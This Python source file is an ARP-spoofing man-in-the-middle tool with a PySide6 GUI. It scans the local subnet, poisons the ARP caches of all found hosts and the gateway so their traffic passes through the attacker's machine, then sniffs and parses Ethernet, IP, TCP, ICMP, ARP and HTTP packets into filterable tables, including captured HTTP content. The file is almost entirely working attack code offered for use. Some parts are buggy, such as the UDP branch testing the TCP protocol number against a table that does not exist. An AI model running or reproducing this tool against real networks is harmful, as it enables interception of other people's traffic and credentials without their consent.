import socket
import struct
import uuid
import codecs
import binascii
from tabnanny import verbose
import psutil
import time
import os
from scapy.all import *
import scapy.config
import scapy.layers.l2
import scapy.route
import sys
import netifaces
import pandas as pd
from scapy.config import conf
from scapy.layers.l2 import ARP, Ether

import pandas as pd

from PySide6.QtWidgets import QTableView, QApplication, QToolBar, QMainWindow, QLineEdit, QWidget, QGridLayout, QPushButton, QLabel, QComboBox, QScrollArea, QVBoxLayout, QStyleOption, QStyle
from PySide6.QtGui import QAction, QPainter
from PySide6.QtCore import QAbstractTableModel, Qt, QModelIndex
import sys

#os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
conf.debug_dissector = 2

def get_default_gateway():
    """ python style if it exists there is a python lib that can do it in 3 lines of code """
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    return default_gateway

#return poperly formated mac adress
def get_mac_adress(bytes_addres):
    bytes_string = map('{:02x}'.format, bytes_addres)
    mac_adress = ':'.join(bytes_string).upper()
    return mac_adress

host_ip = socket.gethostbyname(socket.gethostname())
host_mac = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big')).upper()
gateway_ip = get_default_gateway()
gateway_mac = ''

# Return proper IPv4 addres
def ipv4(addres):
    return '.'.join(map(str, addres))

def parse_http(data):
    try:
        return data.decode('utf-8', errors='ignore')
    except UnicodeDecodeError:
        return data.decode('latin1', errors='ignore')

def Ethernet_frame(data):
    dest_mac, source_mac, proto = struct.unpack('! 6s 6s H', data[:14])
    return {'data': data[14:], 'source_mac' : get_mac_adress(source_mac), 'dest_mac' : get_mac_adress(dest_mac), 'eth_proto' : socket.htons(proto)}

def IPv4_packet(unpacked):
    data = unpacked['data']
    version_header_length = data[0]
    unpacked['version']  = version_header_length >> 4
    unpacked['header_length'] = (version_header_length & 15) * 4
    unpacked['time_to_live'], unpacked['proto'], src, target = struct.unpack('! 8x B B 2x 4s 4s', data[:20])
    unpacked['source_ip'], unpacked['dest_ip'], unpacked['data'] = ipv4(src), ipv4(target), data[unpacked['header_length']:]
    return unpacked

def ARP_packet(unpacked):
    data = unpacked['data']
    unpacked['HTYPE'], unpacked['PTYPE'], unpacked['HLEN'], unpacked['PLEN'],unpacked['operation'], b_SHA, b_SPA, b_THA, b_TPA = struct.unpack('! H H B B H 6s 4s 6s 4s', data)
    unpacked['SHA'], unpacked['SPA'], unpacked['THA'], unpacked['TPA'] = get_mac_adress(b_SHA), ipv4(b_SPA), get_mac_adress(b_THA), ipv4(b_TPA)
    return unpacked

def ICMP_packet(unpacked):
    data = unpacked['data']
    unpacked['icmp_type'], unpacked['code'], unpacked['checksumm'] = struct.unpack('! B B H', data[:4])
    unpacked['data'] = data[4:]
    return unpacked

def TCP_packet(unpacked):
    data = unpacked['data']
    unpacked['source_port'], unpacked['dest_port'], unpacked['sequence'], unpacked['aknowledgment'], unpacked['offset_reseved_flags'] = struct.unpack('! H H L L H', data[:14])
    offset = (unpacked['offset_reseved_flags'] >> 12) * 4
    unpacked['flag_urg'] = (unpacked['offset_reseved_flags'] & 32) >> 5
    unpacked['flag_ack'] = (unpacked['offset_reseved_flags'] & 16) >> 4
    unpacked['flag_psh'] = (unpacked['offset_reseved_flags'] & 8) >> 3
    unpacked['flag_rst'] = (unpacked['offset_reseved_flags'] & 4) >> 2
    unpacked['flag_syn'] = (unpacked['offset_reseved_flags'] & 2) >> 1
    unpacked['flag_fin'] = unpacked['offset_reseved_flags'] & 1
    unpacked['data'] = data[offset:]
    return unpacked

def UDP_packet(unpacked):
    data = unpacked['data']
    unpacked['source_port'], unpacked['dest_port'], unpacked['size'] = struct.unpack('! H H 2x H', data[:8])
    unpacked['data'] = data[8:]
    return unpacked

def HTTP_packet(unpacked):
    data = unpacked['data']
    unpacked['http_string'] = parse_http(data)
    unpacked['data'] = b''
    return unpacked

def long2net(arg):
    if (arg <= 0 or arg >= 0xFFFFFFFF):
        raise ValueError("illegal netmask value", hex(arg))
    return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))


def to_CIDR_notation(bytes_network, bytes_netmask):
    network = scapy.utils.ltoa(bytes_network)
    netmask = long2net(bytes_netmask)
    net = "%s/%s" % (network, netmask)
    if netmask < 16:
        return None
    return net

def scan(net, interface, timeout=5):
    ret = []
    try:
        ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
        for s, r in ans.res:
            line = [r.src, r.psrc]
            try:
                ret.append(line)
            except socket.herror:
                pass
    except socket.error as e:
        raise
    return ret

class Client():
    def __init__(self, ip, mac):
        self.ip = ip
        self.mac = mac
        self.type = (self.ip == host_ip or self.ip == gateway_ip)
        self.arp_packets = 0
    def spoof(self):
        send(Ether(dst=self.mac)/ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = host_mac), verbose=False)
        send(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc = host_mac), verbose=False)
    def restore(self):
        send(Ether(dst=self.mac)/ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = gateway_mac), verbose=False)
        send(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc=self.mac), verbose=False)
    def fire(self):
        try:
            self.spoof()
        except:
            self.restore()

class IPtable():
    def __init__(self, host_mac, host_ip, gateway_ip, gateway_mac):
        self.mac = host_mac
        self.ip = host_ip
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.clients = [Client(self.ip, self.mac), Client(self.gateway_ip, self.gateway_mac)]

    def find(self, client):
        for i, c in enumerate(self.clients):
            if (c.ip == client.ip):
                return i
        return -1

    def emplase(self, client):
        if (self.find(client) == -1):
            self.clients.append(client)

    def scan(self):
        ips = []
        for network, netmask, _, interface, address, _ in scapy.config.conf.route.routes:
            # skip loopback network and default gw
            if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
                continue
            if netmask <= 0 or netmask == 0xFFFFFFFF:
                continue
            # skip docker interface
            if (interface.startswith('docker')
                    or interface.startswith('br-')
                    or interface.startswith('tun')):
                continue
            net = to_CIDR_notation(network, netmask)
            if net:   
                i = scan(net, interface)
                for line in i:
                    ips.append([line[0].upper(), line[1]])
        for i in ips:
            self.emplase(Client(i[1], i[0]))

    def attack(self):
        for client in self.clients:
            if (client.type == False):
                for i in range(20):
                    client.fire()

    def restore(self):
        for client in self.clients:
            if (client.type == False):
                for i in range(20):
                    client.restore()
                    
class Database():
    def __init__(self):
        self.data = {
            'Ethernet_frames' : pd.DataFrame({'data': [], 'source_mac':[], 'dest_mac':[], 'eth_proto':[]}),
            'ARP_packets' : pd.DataFrame({'data': [], 'source_mac':[], 'dest_mac':[], 'eth_proto':[], 'SHA':[], 'SPA':[], 'THA':[], 'TPA':[]}),
            'IP_v4_packets' : pd.DataFrame({'data': [], 'source_mac':[], 'dest_mac':[], 'source_ip':[], 'dest_ip':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[]}),
            'ICMP_packets' : pd.DataFrame({'data': [], 'source_mac':[], 'dest_mac':[], 'source_ip':[], 'dest_ip':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'icmp_type':[],'code':[], 'checksumm':[]}),
            'TCP_packets' : pd.DataFrame({'data': [], 'source_mac':[], 'dest_mac':[], 'source_ip':[], 'dest_ip':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'source_port':[], 'dest_port':[], 'sequence':[], 'aknowledgment':[], 'offset_reseved_flags':[], 'flag_urg':[], 'flag_ack':[], 'flag_psh':[], 'flag_rst':[], 'flag_syn':[], 'flag_fin':[]}),
            'HTTP_packets' : pd.DataFrame({'data': [], 'source_mac':[], 'dest_mac':[], 'source_ip':[], 'dest_ip':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'source_port':[], 'dest_port':[], 'sequence':[], 'aknowledgment':[], 'offset_reseved_flags':[], 'flag_urg':[], 'flag_ack':[], 'flag_psh':[], 'flag_rst':[], 'flag_syn':[], 'flag_fin':[], 'http_string':[]})
        }
        
    def insert_data(self, data):
        unpacked = Ethernet_frame(data)
        if (len(unpacked['data']) >= 20 and unpacked['eth_proto'] == 8):
            unpacked = IPv4_packet(unpacked)
            if (unpacked['proto'] == 1 and len(unpacked['data']) >= 4):
                unpacked = ICMP_packet(unpacked)
                unpacked['data'] = str(unpacked['data'])
                self.data['ICMP_packets'].loc[self.data['ICMP_packets'].shape[0]] = unpacked
            elif (unpacked['proto'] == 6 and len(unpacked['data']) >= 14):
                unpacked = TCP_packet(unpacked)
                if (b'HTTP' in unpacked['data']):
                    unpacked = HTTP_packet(unpacked)
                    unpacked['data'] = str(unpacked['data'])
                    self.data['HTTP_packets'].loc[self.data['HTTP_packets'].shape[0]] = unpacked
                else:
                    unpacked['data'] = str(unpacked['data'])
                    self.data['TCP_packets'].loc[self.data['TCP_packets'].shape[0]] = unpacked
            elif (unpacked['proto'] == 6 and len(unpacked['data']) >= 8):
                unpacked = UDP_packet(unpacked)
                unpacked['data'] = str(unpacked['data'])
                self.data['UDP_packets'].loc[self.data['UDP_packets'].shape[0]] = unpacked
            else:
                unpacked['data'] = str(unpacked['data'])
                self.data['IP_v4_packets'].loc[self.data['IP_v4_packets'].shape[0]] = unpacked
        elif (len(unpacked['data']) == 28 and unpacked['eth_proto'] == 1544 ):
            unpacked = ARP_packet(unpacked)
            unpacked['data'] = str(unpacked['data'])
            self.data['ARP_packets'].loc[self.data['ARP_packets'].shape[0]] = unpacked
        else:
            unpacked['data'] = str(unpacked['data'])
            self.data['Ethernet_frames'].loc[self.data['Ethernet_frames'].shape[0]] = unpacked


class PandasModel(QAbstractTableModel):

    def __init__(self, DataBase, parent=None):
        QAbstractTableModel.__init__(self, parent)
        self.DB = DataBase
        self.type = 'Ethernet_frames'
        self.sort_src_mac , self.sort_dst_mac, self.sort_src_ip , self.sort_dst_ip = '', '', '', ''
    def apply_filters(self):
        df = self.DB.data[self.type]
        if (self.sort_src_mac != ''):
            df = df[df['source_mac'] == self.sort_src_mac]
        if (self.sort_dst_mac != ''):
            df = df[(df['dest_mac'] == self.sort_dst_mac)]
        if ((self.type != 'Ethernet_frame') and (self.type != 'ARP_packets') and (self.sort_src_ip != '')):
            df = df[(df['source_ip'] == self.sort_src_ip) ]
        if ((self.type != 'Ethernet_frame') and (self.type != 'ARP_packets') and (self.sort_dst_ip != '')):
            df = df[(df['dest_ip'] == self.sort_dst_ip)]
        return df
    def rowCount(self, parent=QModelIndex()) -> int:
        if parent == QModelIndex():
            return len(self.apply_filters())
        return 0

    def columnCount(self, parent=QModelIndex()) -> int:
        if parent == QModelIndex():
            return len(self.apply_filters().columns)
        return 0

    def data(self, index: QModelIndex, role=Qt.ItemDataRole):
        if not index.isValid():
            return None

        if role == Qt.ItemDataRole.DisplayRole:
            return str(self.apply_filters().iloc[index.row(), index.column()])

        return None

    def headerData(
        self, section: int, orientation: Qt.Orientation, role: Qt.ItemDataRole
    ):
        if role == Qt.ItemDataRole.DisplayRole:
            if orientation == Qt.Orientation.Horizontal:
                return str(self.apply_filters().columns[section])

            if orientation == Qt.Vertical:
                return str(self.apply_filters().index[section])

        return None
    def flags(self, index):
        return Qt.ItemIsSelectable|Qt.ItemIsEnabled

    def update(self):
        self.beginResetModel()
        self.endResetModel()
    def filter_src_mac(self, filter):
        self.sort_src_mac = filter
    def filter_dst_mac(self, filter):
        self.sort_dst_mac = filter
    def filter_src_ip(self, filter):
        self.sort_src_ip = filter
    def filter_dst_ip(self, filter):
        self.sort_dst_ip = filter

class DFWidget(QTableView):
    def __init__(self, df):
        super().__init__()
        super().horizontalHeader().setStretchLastSection(True)
        super().setAlternatingRowColors(True)
        super().setSelectionBehavior(QTableView.SelectRows)
        self.model = PandasModel(df)
        super().setModel(self.model)
    def update(self):
        self.model.update()
    def change_type(self, type):
        self.model.type = type
    def filter_src_mac(self, filter):
        self.model.filter_src_mac(filter)
    def filter_dst_mac(self, filter):
        self.model.filter_dst_mac(filter)
    def filter_src_ip(self, filter):
        self.model.filter_src_ip(filter)
    def filter_dst_ip(self, filter):
        self.model.filter_dst_ip(filter)
    


class Input_Button(QWidget):
    def __init__(self, parent=None, funk = None, Name = '', Text = ''):
        super().__init__(parent)

        self.imput_line = QLineEdit(parent=self)
        self.imput_line.setPlaceholderText(Text)
        self.imput_line.setClearButtonEnabled(True)
        submit_button = QPushButton(parent=self, text=Name)
        submit_button.clicked.connect(funk)
        layout = QGridLayout()
        layout.addWidget(self.imput_line, 0, 0)
        layout.addWidget(submit_button, 0, 1)
        self.setLayout(layout)

class SuperQLabel(QLabel):
    def __init__(self, *args, **kwargs):
        super(SuperQLabel, self).__init__(*args, **kwargs)

        self.textalignment = Qt.AlignLeft | Qt.TextWrapAnywhere
        self.isTextLabel = True
        self.align = None

    def paintEvent(self, event):

        opt = QStyleOption()
        opt.initFrom(self)
        painter = QPainter(self)

        self.style().drawPrimitive(QStyle.PE_Widget, opt, painter, self)

        self.style().drawItemText(painter, self.rect(),
                                  self.textalignment, self.palette(), True, self.text())

class ScrollLabel(QScrollArea):
 
    # constructor
    def __init__(self, *args, **kwargs):
        QScrollArea.__init__(self, *args, **kwargs)
        self.setWidgetResizable(True)
        content = QWidget(self)
        self.setWidget(content)
        lay = QVBoxLayout(content)
        self.label = SuperQLabel(content)
        self.label.setMaximumWidth(200)
        self.label.setAlignment(Qt.AlignLeft | Qt.AlignTop)
        self.label.setWordWrap(True)
        lay.addWidget(self.label)
 
    def setText(self, text):
        self.label.setText(text)


class Display(QWidget):
    def __init__(self, parent = None, df = None):
        super().__init__(parent)
        self.data = df
        self.type = 'Ethernet_frames'
        self.DF = DFWidget(df)
        self.display = ScrollLabel(self)
        self.display.setMaximumWidth(240)
        self.DF.clicked.connect(self.set_text)
        layout = QGridLayout()
        layout.addWidget(self.DF, 0, 0)
        layout.addWidget(self.display, 0, 1)
        self.setLayout(layout)

    def set_text(self):
        index = self.DF.selectedIndexes()[0].row()
        self.display.setText(self.to_string(self.data.data[self.type].loc[index].to_dict()))

    def update(self):
        self.DF.update()

    def change_type(self, type):
        self.DF.change_type(type)
        self.type = type
    def to_string(self, row = {}):
        ans = ''
        for i in row.items():
            if i[0] != 'data':
                ans += f"{i[0]}: {i[1]}\n"
        ans += f'data: {row["data"]}\n'
        return ans
    def filter_src_mac(self, filter):
        self.DF.filter_src_mac(filter)
    def filter_dst_mac(self, filter):
        self.DF.filter_dst_mac(filter)
    def filter_src_ip(self, filter):
        self.DF.filter_src_ip(filter)
    def filter_dst_ip(self, filter):
        self.DF.filter_dst_ip(filter)




class Main_window(QMainWindow):
    def __init__(self, df):
        super().__init__()
        self.centralWidget = Display(self, df)
        self.setCentralWidget(self.centralWidget)
        self._createToolBars()

    def _createActions(self):
        self.refreshAction = QAction("Refresh", self)
        self.refreshAction.triggered.connect(self.refreshed)
        self.sort_by_src_mac = Input_Button(self, self.filter_src_mac, 'Filter', 'Filter source mac')
        self.sort_by_src_mac.setFocusPolicy(Qt.NoFocus)
        self.sort_by_dst_mac = Input_Button(self, self.filter_dst_mac, 'Filter', 'Filter destination mac')
        self.sort_by_dst_mac.setFocusPolicy(Qt.NoFocus)
        self.sort_by_src_ip = Input_Button(self, self.filter_src_ip, 'Filter', 'Filter source ip')
        self.sort_by_src_ip.setFocusPolicy(Qt.NoFocus)
        self.sort_by_dst_ip = Input_Button(self, self.filter_dst_ip, 'Filter', 'Filter destination ip')
        self.sort_by_dst_ip.setFocusPolicy(Qt.NoFocus)
        self.type = QComboBox()
        self.type.addItem('Ethernet_frames')
        self.type.addItem('ARP_packets')
        self.type.addItem('IP_v4_packets')
        self.type.addItem('ICMP_packets')
        self.type.addItem('UDP_packets')
        self.type.addItem('TCP_packets')
        self.type.addItem('HTTP_packets')
        self.type.setFocusPolicy(Qt.NoFocus)
        self.type.currentTextChanged.connect(self.type_changed)


    def type_changed(self, index):
        self.centralWidget.change_type(index)
        self.centralWidget.update()
    def refreshed(self):
        self.centralWidget.update()
    def filter_src_mac(self):
        self.centralWidget.filter_src_mac(self.sort_by_src_mac.imput_line.displayText())
        self.centralWidget.update()
    def filter_dst_mac(self):
        self.centralWidget.filter_dst_mac(self.sort_by_dst_mac.imput_line.displayText())
        self.centralWidget.update()
    def filter_src_ip(self):
        self.centralWidget.filter_src_ip(self.sort_by_src_ip.imput_line.displayText())
        self.centralWidget.update()
    def filter_dst_ip(self):
        self.centralWidget.filter_dst_ip(self.sort_by_dst_ip.imput_line.displayText())
        self.centralWidget.update()


    def _createToolBars(self):
        self._createActions()
        ActionlBar = self.addToolBar("Actions")
        ActionlBar.addAction(self.refreshAction)
        ActionlBar.addWidget(self.type)
        # Edit toolbar
        SortingToolBar = self.addToolBar("Sorting")
        SortingToolBar.addWidget(self.sort_by_src_mac)
        SortingToolBar.addWidget(self.sort_by_dst_mac)
        SortingToolBar.addWidget(self.sort_by_src_ip)
        SortingToolBar.addWidget(self.sort_by_dst_ip)


def Sniff(db):
    while(True):
        try:
            sniff(prn=lambda x: db.insert_data(x.do_build()), count=0, session = None)
        except:
            continue


if __name__ == "__main__":
    gateway_mac = getmacbyip(gateway_ip).upper()
    Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
    Ips.scan()
    db = Database()
    th_sniff = threading.Thread(target=Sniff, args=(db, ), daemon=True)
    th_sniff.start()
    try:
        Ips.attack()
        app = QApplication([])
        view = Main_window(db)
        view.show()
        app.exec()
        Ips.restore()
    except:
        Ips.restore()
        raise()